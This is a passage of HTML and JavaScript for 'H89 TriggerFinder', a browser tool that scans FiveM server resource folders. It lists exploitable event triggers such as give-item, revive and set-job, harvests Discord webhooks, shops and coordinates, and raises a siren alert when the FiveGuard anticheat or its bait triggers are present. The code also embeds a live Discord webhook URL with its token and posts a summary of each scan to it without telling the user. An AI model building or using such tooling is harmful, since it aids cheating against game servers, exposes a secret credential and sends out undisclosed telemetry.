 <div class="filter-explanation">Triggers related to jobs or job assignments.</div>
 </label>
 <label><input type="checkbox" id="filter-giveitem" value="giveitem"> Give Item
 <div class="filter-explanation">Triggers related to giving items to players.</div>
 </label>
 <label><input type="checkbox" id="filter-revive" value="revive"> Revive
 <div class="filter-explanation">Triggers related to reviving players.</div>
 </label>
 <label><input type="checkbox" id="filter-handcuff" value="handcuff"> Handcuff
 <div class="filter-explanation">Triggers related to handcuffing players.</div>
 </label>
 <label><input type="checkbox" id="filter-setjob" value="setjob"> Set Job
 <div class="filter-explanation">Triggers related to setting a player's job.</div>
 </label>
 <label><input type="checkbox" id="filter-bait" value="bait"> Bait Trigger
 <div class="filter-explanation">Triggers designed to detect or punish exploits.</div>
 </label>
 <label><input type="checkbox" id="filter-comms" value="comms"> Comms
 <div class="filter-explanation">Triggers related to community service or tasks.</div>
 </label>
 <label><input type="checkbox" id="filter-jail" value="jail"> Jail
 <div class="filter-explanation">Triggers related to jailing or arresting players.</div>
 </label>
 </div>
 </div>
 </div>

 
<div class="upload-box" id="uploadBox">
  <button class="upload-btn" id="chooseFolderBtn" type="button">
    <i class="fa-solid fa-folder-open"></i> Choose Folder / Files
  </button>
  <span class="file-count" id="fileCount">No files selected</span>
</div>

<input type="file" id="folder-input" webkitdirectory="" directory="" multiple="" style="display:none;">
 <div id="progress-container" class="progress-v2" style="display:none;">
  <div class="progress-top">
    <div class="progress-left">
      <span class="progress-label" id="progress-label">Preparing‚Ä¶</span>
      <span class="progress-sub" id="progress-sub"></span>
    </div>
    <div class="progress-right">
      <span class="progress-count"><span id="progress-current">0</span>/<span id="progress-total">0</span></span>
      <span class="progress-percent" id="progress-percent">0%</span>
    </div>
  </div>
  <div class="progress-track">
    <div id="progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
      <span id="progress-bar-text">0%</span>
    </div>
  </div>
</div>
 
<div id="scan-loading" class="scan-loading hidden" aria-live="polite">
 <span class="loader"></span>
 <div class="scan-text">
 <div class="scan-title">Scanning‚Ä¶</div>
 <div class="scan-meta">Speed: <span id="scan-speed">0</span> files/s ‚Ä¢ Scanned: <span id="scan-scanned">0</span></div>
 </div>
</div>

 <!-- Webhook container before results -->
 <div class="scan-columns">
<div class="webhook-container is-hidden" id="webhooksPanel">
 <h2><i class="fab fa-discord"></i> Found Webhooks</h2> <!-- Added heading -->
 <div id="webhooks-list"></div>
 </div>
 <div id="dockResizeHandle" class="dock-resize-handle" title="Drag to resize"></div>
 <!-- Results container -->
 <div id="results-container">
 <div class="scan-columns-head" id="scanColumnsHead" style="display:none;">
   <div>#</div>
   <div>TYPE</div>
   <div>TRIGGER</div>
   <div>FILE</div>
   <div>LINE</div>
   <div>RISK</div>
   <div>ACTIONS</div>
 </div>
 <div id="results"></div>
 </div>

 <!-- High-Risk panel (v5.7) -->
 <div id="h89-highrisk-panel" style="display:none;">
   <div class="h89-panel-head">
     <div class="h89-panel-title">High-Risk Resources</div>
     <div class="h89-panel-sub">Critical detections list (CYBER / FiveGuard / shared_script @CyberAnticheat)</div>
     <button class="h89-tbtn" id="h89-highrisk-close" type="button" title="Close">Close</button>
   </div>
   <div id="h89-highrisk-empty" class="h89-panel-empty">No high-risk resources detected.</div>
   <div id="h89-highrisk-list" class="h89-risk-list"></div>
 </div>

 </div>
 
 <!-- Logs panel -->
 <div id="logs-container">
 <div class="logs-head">
 <div class="logs-title"><i class="fas fa-terminal"></i> Live Logs</div>
 <div class="logs-actions">
 <button class="logs-btn" id="logs-clear" title="Clear logs">Clear</button>
 <button class="logs-btn" id="logs-copy" title="Copy logs">Copy</button>
 </div>
 </div>
 <div id="logs"></div>
 </div>

 <div id="message"></div>
 <button id="download-btn" disabled=""><i class="fas fa-download"></i> user h89 </button> <!-- Added icon -->
 </div>
 </div>
 </div>

 <!-- Audio Element - Use consistent ID and source -->
 <audio id="background-music" src="" loop="" preload="auto"></audio> <!-- Match skidTriggerCreator audio -->

 <script>
 // ... existing constants (DEBUG_MODE, allTriggers, allShops) ...
 const DEBUG_MODE = true;

 // ===== FiveGuard Manifest Targets =====
 const H89_TARGET_FILES = [
 "ai_module_fg-obfuscated.lua",
"ai_module_fg-obfuscated.js",
"shared_fg-obfuscated.lua",
"sv-resource-obfuscated.lua",
"sv-resource-obfuscated.js",
"cl-resource-obfuscated.lua",
"vrp_shared-obfuscated.lua",
"protection_shared-obfuscated.lua"

 ].map(s => (s||"").toLowerCase());

 const H89_MANIFEST_NAMES = new Set(["fxmanifest.lua","__resource.lua"]);


// ===== Protected Banner Rules (Severity) =====
const H89_PROTECT_BANNER_RULES = [
  { rx: /electron-services\.com/i, severity: "HIGH", reason: "Protected banner domain" },
  { rx: /the most advanced fiveM anticheat/i, severity: "HIGH", reason: "Protected banner phrase" },
  { rx: /the most advanced fivem anticheat/i, severity: "HIGH", reason: "Protected banner phrase" }
];
const H89_BANNER_SEEN = new Set();
function h89MatchBannerRule(content){
  const txt = String(content || "");
  for (const r of H89_PROTECT_BANNER_RULES){
    try{ if (r.rx.test(txt)) return r; }catch(_){}
  }
  
// ===== Obfuscated/Protected Manifest Rules (severity) =====
const H89_FG_MANIFEST_FILES = [
  "sv-resource-obfuscated.lua",
  "sv-resource-obfuscated.js",
  "cl-resource-obfuscated.lua",
  "shared_fg-obfuscated.lua",
  "ai_module_fg-obfuscated.lua",
  "ai_module_fg-obfuscated.js",
  "vrp_shared-obfuscated.lua",
  "protection_shared-obfuscated.lua"
];
const H89_FG_FILESET = new Set(H89_FG_MANIFEST_FILES.map(s => String(s).toLowerCase()));

const H89_FG_AC_RULE = /(^|\n)\s*ac\s+['"]fg['"]\s*($|\n)/i;
const H89_FG_SEEN = new Set();
function h89IsManifestPath(p){
  const s = String(p||"").toLowerCase().replace(/\\/g,"/");
  return s.endsWith("/fxmanifest.lua") || s.endsWith("/__resource.lua") || s.endsWith("fxmanifest.lua") || s.endsWith("__resource.lua");
}
function h89HasManifestEntry(text, name){
  try{
    const esc = String(name).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const rx = new RegExp(String.raw`['"]${esc}['"]`, "i");
    return rx.test(String(text||""));
  }catch(_){ return false; }
}


return null;
}

 function h89DownloadBlob(filename, blob){
 const a = document.createElement('a');
 a.href = URL.createObjectURL(blob);
 a.download = filename;
 document.body.appendChild(a);
 a.click();
 setTimeout(()=>{ URL.revokeObjectURL(a.href); a.remove(); }, 1200);
 }

 let h89FiveGuardOnly = false;
 let h89FiveGuardAutoZip = true;
 let h89FiveGuardBeepedAt = 0;

 function h89ArmSound(){
 try{
 if (typeof isMuted !== 'undefined' && isMuted) return;
 }catch(e){}
 if (window.__h89SoundArmed) return;
 window.__h89SoundArmed = true;

 // Prepare WebAudio (siren) - requires a user gesture
 try{
 const AudioCtx = window.AudioContext || window.webkitAudioContext;
 if (AudioCtx){
 window.__h89AudioCtx = new AudioCtx();
 if (window.__h89AudioCtx.state === "suspended"){
 window.__h89AudioCtx.resume().catch(()=>{});
 }
 }
 }catch(e){}

 // Warm up voices list
 try{ speechSynthesis.getVoices(); }catch(e){}
 }

 // One click to unlock sound/voice (browser policy)
 document.addEventListener("click", h89ArmSound, { once: true });

 function h89PlaySiren(ms = 900){
 try{
 if (typeof isMuted !== 'undefined' && isMuted) return;
 }catch(e){}
 const ctx = window.__h89AudioCtx;
 if (!window.__h89SoundArmed || !ctx) return;

 try{
 if (ctx.state === "suspended") ctx.resume().catch(()=>{});
 const o = ctx.createOscillator();
 const g = ctx.createGain();
 o.type = "sawtooth";
 g.gain.value = 0.0001;
 o.connect(g); g.connect(ctx.destination);

 const now = ctx.currentTime;
 const end = now + (ms/1000);

 // ramp up
 g.gain.setValueAtTime(0.0001, now);
 g.gain.exponentialRampToValueAtTime(0.35, now + 0.02);

 // siren sweep
 const step = 0.12;
 let t = now;
 let up = true;
 while (t < end){
 o.frequency.setValueAtTime(up ? 880 : 440, t);
 up = !up;
 t += step;
 }

 o.start(now);
 o.stop(end);

 // ramp down
 g.gain.setValueAtTime(0.35, end - 0.05);
 g.gain.exponentialRampToValueAtTime(0.0001, end);
 }catch(e){}
 }

 function h89PickFemaleEnglishVoice(){
 try{
 const voices = speechSynthesis.getVoices() || [];
 if (!voices.length) return null;

 const isEnglish = (v) => /en/i.test(v.lang || "");
 const looksFemale = (v) => /female|zira|susan|samantha|victoria|karen|aria|jenny|natasha|mia|emma|olivia|zoe|lisa|allison/i.test((v.name || ""));

 return (
 voices.find(v => isEnglish(v) && looksFemale(v) && /en-US/i.test(v.lang || "")) ||
 voices.find(v => isEnglish(v) && looksFemale(v) && /en-GB/i.test(v.lang || "")) ||
 voices.find(v => isEnglish(v) && looksFemale(v)) ||
 voices.find(v => /en-US/i.test(v.lang || "")) ||
 voices.find(v => isEnglish(v)) ||
 voices[0] ||
 null
 );
 }catch(e){ return null; }
 }

 function h89SpeakFiveGuardFemale(){
 try{
 if (typeof isMuted !== 'undefined' && isMuted) return;
 }catch(e){}
 if (!window.__h89SoundArmed) return;
 if (!("speechSynthesis" in window)) return;

 try{
 const u = new SpeechSynthesisUtterance("FiveGuard detected");
 u.rate = 1;
 u.pitch = 1;
 u.volume = 1;

 const v = h89PickFemaleEnglishVoice();
 if (v) u.voice = v;

 speechSynthesis.cancel();
 speechSynthesis.speak(u);
 }catch(e){}
 }

 function h89FiveGuardBeep(){
 // Backwards-compatible name: now does Siren + Female Voice
 try{
 if (typeof isMuted !== 'undefined' && isMuted) return;
 }catch(e){}
 const now = Date.now();
 if (now - h89FiveGuardBeepedAt < 1400) return; // throttle
 h89FiveGuardBeepedAt = now;

 // If not armed yet, do nothing (browser policy).
 if (!window.__h89SoundArmed) return;

 h89PlaySiren(900);
 h89SpeakFiveGuardFemale();
 }

 function extractManifestSharedRefs(content, folderName, manifestFile, folderPath){
  const hits = [];
  const src = String(content || "");

  // helper: push hit if matches target files
  function checkAndPush(kind, p, raw){
    const path = (p || "").trim();
    if(!path) return;
    const low = path.toLowerCase();
    if (H89_TARGET_FILES.some(t => low.endsWith(t))){
      hits.push({ type: kind, ref: path, folder: folderName, file: manifestFile, path: folderPath, raw: raw || "" });
    }
  }

  // 1) Single directives: shared_script / server_script / client_script / file
  // supports: key 'a.lua' ; key("a.lua")
  const singleRe = /(shared_script|server_script|client_script|file)\s*\(\s*['"]([^'"]+)['"]\s*\)|(shared_script|server_script|client_script|file)\s+['"]([^'"]+)['"]/gi;
  let m;
  while((m = singleRe.exec(src)) !== null){
    const kind = (m[1] || m[3] || "").toLowerCase();
    const p = (m[2] || m[4] || "").trim();
    checkAndPush(kind, p, m[0]);
  }

  // 2) Table directives: shared_scripts / server_scripts / client_scripts / files
  const tableRe = /(shared_scripts|server_scripts|client_scripts|files)\s*\{([\s\S]*?)\}/gi;
  while((m = tableRe.exec(src)) !== null){
    const kind = (m[1] || "").toLowerCase();
    const body = m[2] || "";
    const strRe = /['"]([^'"]+)['"]/g;
    let s;
    while((s = strRe.exec(body)) !== null){
      const p = (s[1] || "").trim();
      checkAndPush(kind, p, `${kind} { ... '${p}' ... }`);
    }
  }

  return hits;
}

 function h89ApplySearchAndFilters(){
 const query = (searchInput?.value || "").toLowerCase();
 let list = allTriggers.slice();
 if (h89FiveGuardOnly){
 list = list.filter(t => t.guard === "FiveGuard");
 }

 // apply checkbox filters (existing TriggerFinder filters)
 const activeFilters = Array.from(filters || [])
 .filter(f => f.checked)
 .map(f => String(f.value||"").toLowerCase());

 if (activeFilters.length){
 list = list.filter(t => activeFilters.some(k => (t.trigger||"").toLowerCase().includes(k)));
 }
 if (query){
 list = list.filter(t => 
 (t.trigger||"").toLowerCase().includes(query) ||
 (t.folder||"").toLowerCase().includes(query) ||
 (t.file||"").toLowerCase().includes(query) ||
 (t.path||"").toLowerCase().includes(query) ||
 (t.guard||"").toLowerCase().includes(query)
 );
 }
 displayTriggers(list);
 updateStats();
 }

 let allTriggers = []; // Store all triggers for search functionality

// ===== Advanced Filters (Risk / Type / File) =====
const H89_FILTERS = {
  risk: "any",   // any | high | low
  type: "any",   // any | <guard/type>
  file: ""       // substring
};

function h89Normalize(s){ return String(s||"").toLowerCase(); }

function h89ComputeRiskFromGuard(guard){
  const g = h89Normalize(guard);
  if (g.includes("fiveguard") || g.includes("anticheat") || g.includes("cyber")) return "high";
  return "low";
}

function h89ApplyAdvancedFilters(list){
  const risk = H89_FILTERS.risk;
  const type = H89_FILTERS.type;
  const fileQ = h89Normalize(H89_FILTERS.file).trim();

  return (list || []).filter(t=>{
    const guard = t.guard ? String(t.guard) : "Trigger";
    const file = t.file ? `${t.folder} ‚Ä¢ ${t.file}` : (t.folder || "");
    const r = h89ComputeRiskFromGuard(guard);

    if (risk !== "any" && r !== risk) return false;
    if (type !== "any" && h89Normalize(guard) !== h89Normalize(type)) return false;
    if (fileQ && !h89Normalize(file).includes(fileQ)) return false;

    return true;
  });
}

function h89RefreshFilterTypeOptions(){
  const sel = document.getElementById("h89FilterType");
  if (!sel) return;
  const cur = sel.value || H89_FILTERS.type || "any";
  const types = Array.from(new Set((allTriggers||[]).map(t=> t.guard ? String(t.guard) : "Trigger"))).sort((a,b)=>a.localeCompare(b));
  sel.innerHTML = `<option value="any">Any</option>` + types.map(t=>`<option value="${t.replace(/"/g,'&quot;')}">${t}</option>`).join("");
  // restore current if exists
  const exists = Array.from(sel.options).some(o=>o.value===cur);
  sel.value = exists ? cur : "any";
}

function h89OpenFilters(){
  const p = document.getElementById("h89FiltersPanel");
  if (!p) return;
  p.classList.add("show");
  p.setAttribute("aria-hidden","false");
  // sync UI values
  const r = document.getElementById("h89FilterRisk");
  const t = document.getElementById("h89FilterType");
  const f = document.getElementById("h89FilterFile");
  if (r) r.value = H89_FILTERS.risk;
  if (t) t.value = H89_FILTERS.type;
  if (f) f.value = H89_FILTERS.file;
}

function h89CloseFilters(){
  const p = document.getElementById("h89FiltersPanel");
  if (!p) return;
  p.classList.remove("show");
  p.setAttribute("aria-hidden","true");
}

function h89WireFiltersUI(){
  const btn = document.getElementById("h89-jump-filters");
  const close = document.getElementById("h89FiltersClose");
  const apply = document.getElementById("h89FiltersApply");
  const clear = document.getElementById("h89FiltersClear");
  const r = document.getElementById("h89FilterRisk");
  const t = document.getElementById("h89FilterType");
  const f = document.getElementById("h89FilterFile");

  btn && btn.addEventListener("click", ()=>{
    const p = document.getElementById("h89FiltersPanel");
    if (p && p.classList.contains("show")) h89CloseFilters(); else h89OpenFilters();
  });
  close && close.addEventListener("click", h89CloseFilters);

  apply && apply.addEventListener("click", ()=>{
    H89_FILTERS.risk = r ? r.value : "any";
    H89_FILTERS.type = t ? t.value : "any";
    H89_FILTERS.file = f ? f.value : "";
    // Re-render with filters applied
    try{
      const filtered = h89ApplyAdvancedFilters(allTriggers);
      displayTriggers(filtered);
      updateStats && updateStats();
    }catch(e){ console.warn("Apply filters failed", e); }
    h89CloseFilters();
  });

  clear && clear.addEventListener("click", ()=>{
    H89_FILTERS.risk = "any"; H89_FILTERS.type = "any"; H89_FILTERS.file = "";
    if (r) r.value = "any";
    if (t) t.value = "any";
    if (f) f.value = "";
    try{ displayTriggers(allTriggers); updateStats && updateStats(); }catch(e){}
  });

  // quick apply on enter in file box
  f && f.addEventListener("keydown", (e)=>{
    if (e.key === "Enter"){ e.preventDefault(); apply && apply.click(); }
    if (e.key === "Escape"){ e.preventDefault(); h89CloseFilters(); }
  });
}
 let allShops = []; // Store all shops for download functionality
 let allCoords = []; // Store all coordinates found

 // Remove dynamic title emoji logic
 // const emojis = [...]
 // function updateTitleWithEmoji() { ... }
 // setInterval(updateTitleWithEmoji, 500);
 // updateTitleWithEmoji();
 document.title = " No name"; // Set a static title

 // --- Merged JavaScript from skidTriggerCreator ---

 // Click to start overlay
 const overlay = document.getElementById('text-overlay'); // Use new ID
 const clickText = document.getElementById('click-text'); // Use new ID
 const backgroundMusic = document.getElementById('background-music'); // Use new ID
 const videoBg = document.getElementById('video-bg'); // Use new ID

 if (overlay && clickText && backgroundMusic && videoBg) {
 overlay.addEventListener('click', function() {
 overlay.classList.add('hidden');
 initializeMuteState(); // Initialize mute state based on localStorage
 backgroundMusic.play().catch(error => {
 console.log("Background music autoplay failed:", error);
 });
 videoBg.play().catch(error => {
 console.log("Background video autoplay failed:", error);
 });
 }, { once: true });
 } else {
 console.error("Overlay, click text, background music, or video background element not found.");
 if(overlay) overlay.style.display = 'none';
 }

 // Mute button functionality
 const muteButton = document.getElementById('mute-button'); // Use new ID
 const muteIcon = muteButton ? muteButton.querySelector('i') : null; // Check if muteButton exists
 const audioElements = [backgroundMusic, videoBg]; // Include video in mute control
 let isMuted = localStorage.getItem('muted') === 'true';

 function updateMuteStatus(muted) {
 isMuted = muted;
 audioElements.forEach(audio => {
 if (audio) audio.muted = isMuted;
 });
 if (muteIcon) muteIcon.className = isMuted ? 'fas fa-volume-xmark' : 'fas fa-volume-high';
 localStorage.setItem('muted', isMuted);
 if (muteButton) muteButton.setAttribute('aria-label', isMuted ? 'Unmute sound' : 'Mute sound');
 }

 function toggleMute() {
 updateMuteStatus(!isMuted);
 }

 function initializeMuteState() {
 isMuted = localStorage.getItem('muted') === 'true';
 audioElements.forEach(audio => {
 if (audio) audio.muted = isMuted;
 });
 if (muteIcon) muteIcon.className = isMuted ? 'fas fa-volume-xmark' : 'fas fa-volume-high';
 if (muteButton) muteButton.setAttribute('aria-label', isMuted ? 'Unmute sound' : 'Mute sound');
 }

 if (muteButton) {
 muteButton.addEventListener('click', toggleMute);
 }
 // initializeMuteState called after overlay click

 // Optimized enhanced snowflake effect with DOM element limit
 const MAX_SNOWFLAKES_FINDER = 35;
 let activeSnowflakesFinder = 0;
 const snowflakeSymbols = ['‚ùÑ', '‚ùÖ', '‚ùÜ', '*']; // Cache symbol array

 function createSnowflake() {
 // Prevent creating too many snowflakes
 if (activeSnowflakesFinder >= MAX_SNOWFLAKES_FINDER) {
 return;
 }

 activeSnowflakesFinder++;
 const snowflake = document.createElement('div');
 const isSpecial = Math.random() < 0.1; // 10% chance for special snowflake
 
 if (isSpecial) {
 snowflake.innerHTML = '‚ú®'; // Special sparkle
 snowflake.classList.add('snowflake', 'special');
 } else {
 snowflake.innerHTML = snowflakeSymbols[Math.floor(Math.random() * snowflakeSymbols.length)];
 snowflake.classList.add('snowflake');
 }
 
 snowflake.style.left = Math.random() * 100 + 'vw';
 const duration = Math.random() * 10 + 10; // 10-20 seconds fall time
 snowflake.style.animationDuration = duration + 's';
 snowflake.style.opacity = Math.random() * 0.5 + 0.3; // 0.3 - 0.8 opacity
 snowflake.style.fontSize = Math.random() * 10 + 10 + 'px'; // 10px - 20px size

 document.body.appendChild(snowflake);

 // Flag to prevent double cleanup
 let cleaned = false;
 
 function cleanup() {
 if (cleaned) return;
 cleaned = true;
 if (snowflake.parentNode) {
 snowflake.remove();
 }
 activeSnowflakesFinder = Math.max(0, activeSnowflakesFinder - 1);
 }

 // Use animationend event for accurate cleanup
 snowflake.addEventListener('animationend', cleanup, { once: true });

 // Fallback timeout
 setTimeout(cleanup, (duration + 2) * 1000);
 }

 function startSnowfall() {
 const currentMonth = new Date().getMonth() + 1;
 if (currentMonth === 12 || currentMonth === 1 || currentMonth === 2) {
 // Check if interval already running to avoid duplicates if script reloads
 if (!window.snowfallInterval) {
 window.snowfallInterval = setInterval(createSnowflake, 600); // Reduced from 300ms
 }
 }
 }
 // Start snowfall on load (if it's winter)
 startSnowfall();

 // --- Original Trigger Finder JavaScript (adapted variables) ---

 // Removed old overlay, mute, video, snowflake JS

 // Cache DOM elements for stats to avoid repeated lookups
 const statsElements = {
 triggersCount: null,
 webhooksCount: null,
 filesCount: null,
 shopsCount: null,
 coordsCount: null,
 fiveguardCount: null,
 initialized: false
 };

 function initStatsElements() {
 if (!statsElements.initialized) {
 statsElements.triggersCount = document.getElementById('triggers-count');
 statsElements.webhooksCount = document.getElementById('webhooks-count');
 statsElements.filesCount = document.getElementById('files-count');
 statsElements.shopsCount = document.getElementById('shops-count');
 statsElements.coordsCount = document.getElementById('coords-count');
 statsElements.fiveguardCount = document.getElementById('fiveguard-count');
 statsElements.initialized = true;
 }
 }

 // Enhanced stats update function with animation
 function updateStats() {
 initStatsElements();
 
 // Animate the numbers
 if (statsElements.triggersCount) animateCounter(statsElements.triggersCount, allTriggers.length);
 if (statsElements.webhooksCount) {
 const uniqueWebhooks = document.querySelectorAll('.webhook').length;
 animateCounter(statsElements.webhooksCount, uniqueWebhooks);
 }
 if (statsElements.shopsCount) animateCounter(statsElements.shopsCount, allShops.length);
 if (statsElements.coordsCount) animateCounter(statsElements.coordsCount, allCoords.length);
 // FiveGuard risk count (unique resources)
 if (statsElements.fiveguardCount) {
   const fg = (window.__h89Detections && window.__h89Detections.fiveguard) ? window.__h89Detections.fiveguard.size : 0;
   animateCounter(statsElements.fiveguardCount, fg);
 }
 }

 // Counter animation - optimized to skip animation when values are same
 function animateCounter(element, target) {
 const start = parseInt(element.textContent) || 0;
 
 // Skip animation if already at target
 if (start === target) return;
 
 const duration = 1000;
 const startTime = performance.now();
 
 function updateCounter(currentTime) {
 const elapsed = currentTime - startTime;
 const progress = Math.min(elapsed / duration, 1);
 const current = Math.floor(start + (target - start) * progress);
 
 element.textContent = current;
 
 if (progress < 1) {
 requestAnimationFrame(updateCounter);
 }
 }
 
 requestAnimationFrame(updateCounter);
 }

 // Enhanced message display function
 function showMessage(text, type = 'success', typing = false) {
 const messageDiv = document.getElementById('message');
 if (!messageDiv) return;
 
 messageDiv.className = type;
 
 if (typing) {
 messageDiv.classList.add('typing-effect');
 messageDiv.textContent = '';
 let i = 0;
 const typewriter = () => {
 if (i < text.length) {
 messageDiv.textContent += text.charAt(i);
 i++;
 setTimeout(typewriter, 30); // Reduced from 50ms to 30ms for smoother typing
 } else {
 setTimeout(() => messageDiv.classList.remove('typing-effect'), 1000);
 }
 };
 typewriter();
 } else {
 messageDiv.textContent = text;
 }
 }

 // Add loading indicator
 function showLoading(show = true) {
 const searchButton = document.getElementById('search-button');
 if (!searchButton) return;
 
 if (show) {
 searchButton.innerHTML = '<div class="loading"></div> Processing...';
 searchButton.disabled = true;
 } else {
 searchButton.innerHTML = '<i class="fas fa-search"></i> Search';
 searchButton.disabled = false;
 }
 }

 // Notification system
 function showNotification(message, type = 'info', duration = 3000) {
 const notification = document.createElement('div');
 notification.className = `notification ${type}`;
 notification.innerHTML = `
 <div style="display: flex; align-items: center; gap: 10px;">
 <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-triangle' : 'info-circle'}"></i>
 <span>${message}</span>
 </div>
 `;
 
 document.body.appendChild(notification);
 
 setTimeout(() => notification.classList.add('show'), 100);
 
 setTimeout(() => {
 notification.classList.remove('show');
 setTimeout(() => notification.remove(), 300);
 }, duration);
 }

 // Element references
 const folderInput = document.getElementById('folder-input');

  // ===== Upload UI bindings (patched) =====
  const chooseFolderBtn = document.getElementById('chooseFolderBtn');
  const fileCountEl = document.getElementById('fileCount');

  if (chooseFolderBtn && folderInput) {
    chooseFolderBtn.addEventListener('click', () => folderInput.click());
  }

  function updateFileCountLabel(files){
    if (!fileCountEl) return;
    const n = files ? files.length : 0;
    fileCountEl.textContent = n ? `${n.toLocaleString()} files selected` : 'No files selected';
  }

 const progressContainer = document.getElementById('progress-container');
 const progressBar = document.getElementById('progress-bar');

 // Progress v2 meta (optional ‚Äì present in v5.4)
 const progressBarText = document.getElementById('progress-bar-text');
 const progressLabelEl = document.getElementById('progress-label');
 const progressSubEl = document.getElementById('progress-sub');
 const progressCurEl = document.getElementById('progress-current');
 const progressTotEl = document.getElementById('progress-total');
 const progressPctEl = document.getElementById('progress-percent');

 function setProgressV2(pct, cur, tot, label, sub){
   const p = Math.max(0, Math.min(100, Number(pct)||0));
   if (progressContainer) progressContainer.style.display = 'block';
   if (progressBar){
     progressBar.style.width = `${p}%`;
     progressBar.setAttribute('aria-valuenow', String(Math.round(p)));
   }
   const txt = `${Math.round(p)}%`;
   if (progressBarText) progressBarText.textContent = txt;
   else if (progressBar) progressBar.textContent = txt;

   if (progressLabelEl && label) progressLabelEl.textContent = label;
   if (progressSubEl) progressSubEl.textContent = sub || '';
   if (progressCurEl && typeof cur !== "undefined") progressCurEl.textContent = String(cur);
   if (progressTotEl && typeof tot !== "undefined") progressTotEl.textContent = String(tot);
   if (progressPctEl) progressPctEl.textContent = txt;
 }

 const resultsContainer = document.getElementById('results'); // Keep this ID for results content
 const searchInput = document.getElementById('search');
 const searchButton = document.getElementById('search-button');
 const downloadButton = document.getElementById('download-btn');
 const filters = document.querySelectorAll('#filters input[type="checkbox"]');
// ===== Live Logs helpers =====
const logsEl = document.getElementById('logs');
const logsClearBtn = document.getElementById('logs-clear');
const logsCopyBtn = document.getElementById('logs-copy');
const LOG_MAX = 350;
let _logCount = 0;

function _timeNow(){
 const d = new Date();
 return d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', second:'2-digit'});
}

function addLog(type, message){
 if(!logsEl) return;
 const cls = (type === 'ok') ? 'log-ok' : (type === 'warn') ? 'log-warn' : (type === 'err') ? 'log-err' : 'log-info';
 const line = document.createElement('div');
 line.className = `log-line ${cls}`;
 const tag = (type === 'ok') ? 'OK' : (type === 'warn') ? 'WARN' : (type === 'err') ? 'ERR' : 'INFO';
 line.innerHTML = `<div class="log-time">${_timeNow()}</div><div class="log-tag">${tag}</div><div class="log-msg"></div>`;
 line.querySelector('.log-msg').textContent = message;
 logsEl.appendChild(line);
 _logCount++;
 // Trim old lines
 while(_logCount > LOG_MAX && logsEl.firstChild){
 logsEl.removeChild(logsEl.firstChild);
 _logCount--;
 }
 logsEl.scrollTop = logsEl.scrollHeight;
}

logsClearBtn && logsClearBtn.addEventListener('click', ()=>{
 if(!logsEl) return;
 logsEl.innerHTML = '';
 _logCount = 0;
 addLog('info', 'Logs cleared.');
});

logsCopyBtn && logsCopyBtn.addEventListener('click', async ()=>{
 if(!logsEl) return;
 const text = Array.from(logsEl.querySelectorAll('.log-line')).map(l=>{
 const t = l.querySelector('.log-time')?.textContent || '';
 const tag = l.querySelector('.log-tag')?.textContent || '';
 const msg = l.querySelector('.log-msg')?.textContent || '';
 return `[${t}] ${tag}: ${msg}`;
 }).join('\n');
 try{
 await navigator.clipboard.writeText(text);
 addLog('ok', 'Logs copied to clipboard.');
 }catch(e){
 addLog('warn', 'Copy failed. Your browser blocked clipboard.');
 }
});

// ===== Discord summary (webhook) =====
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1468867164147548191/sXsjR0EF_CmoL8KNhKlJEEUOA17P00anYCZ2gWz8ubi6J3a0jN6azpJnVqbjzT2UaS9B";
async function sendDiscordSummary(summary){
 if(!DISCORD_WEBHOOK_URL) return;
 try{
 const payload = {
 username: "H89 TriggerFinder",
 embeds: [{
 title: "Scan Finished",
 description: summary.title || "TriggerFinder scan completed.",
 color: 16711680,
 fields: [
 { name: "Files", value: String(summary.files ?? 0), inline: true },
 { name: "Triggers", value: String(summary.triggers ?? 0), inline: true },
 { name: "Webhooks", value: String(summary.webhooks ?? 0), inline: true },
 { name: "Shops", value: String(summary.shops ?? 0), inline: true },
 { name: "Coords", value: String(summary.coords ?? 0), inline: true },
 { name: "Duration", value: (summary.durationSec ?? 0) + "s", inline: true },
 ],
 footer: { text: "H89 ‚Ä¢ " + new Date().toLocaleString() }
 }]
 };
 await fetch(DISCORD_WEBHOOK_URL, {
 method: "POST",
 headers: {"Content-Type":"application/json"},
 body: JSON.stringify(payload)
 });
 addLog('ok', 'Discord summary sent.');
 }catch(e){
 addLog('warn', 'Discord summary failed (CORS / network).');
 }
}

 // Initialize stats (now that function is defined)
 updateStats();

 // Helper functions for the trigger finder
 function extractTriggers(content, folderPath) {
 // Blacklist RegisterNetEvent and only capture TriggerEvent and TriggerServerEvent
 const triggerRegex = /(?:TriggerEvent|TriggerServerEvent)\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g;
 const clientTriggerRegex = /TriggerEvent\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g;
 const serverTriggerRegex = /TriggerServerEvent\s*\(\s*['"]([^'"]+)['"](?:,[^)]*)?\)/g;

 const triggers = [];
 let match;

 // Generic trigger capture (excluding RegisterNetEvent)
 while ((match = triggerRegex.exec(content)) !== null) {
 triggers.push({
 trigger: match[1], // Just the event name
 fullLine: match[0], // Keep the full line for context if needed
 folder: folderPath,
 type: match[0].startsWith('TriggerServerEvent') ? 'Server' : 'Client'
 });
 }

 // Remove duplicates based on trigger name and folder
 const uniqueTriggers = Array.from(new Map(triggers.map(t => [`${t.folder}-${t.trigger}`, t])).values());

 // Return formatted for display
 return uniqueTriggers.map(t => ({
 trigger: t.fullLine, // Display the full line
 folder: t.folder
 }));
 }

 // Enhanced coords extraction function
 function extractCoords(content, folderPath) {
 const coords = [];
 
 // Comprehensive coordinate patterns
 const coordPatterns = [
 // Vector3 patterns
 /vector3\s*\(\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*\)/gi,
 // Vector4 patterns (includes heading)
 /vector4\s*\(\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*\)/gi,
 // Table/object coordinate patterns
 /{\s*x\s*=\s*(-?\d+\.?\d*)\s*,\s*y\s*=\s*(-?\d+\.?\d*)\s*,\s*z\s*=\s*(-?\d+\.?\d*)/gi,
 // Array coordinate patterns
 /{\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*,\s*(-?\d+\.?\d*)\s*}/g,
 // Blip creation coordinates
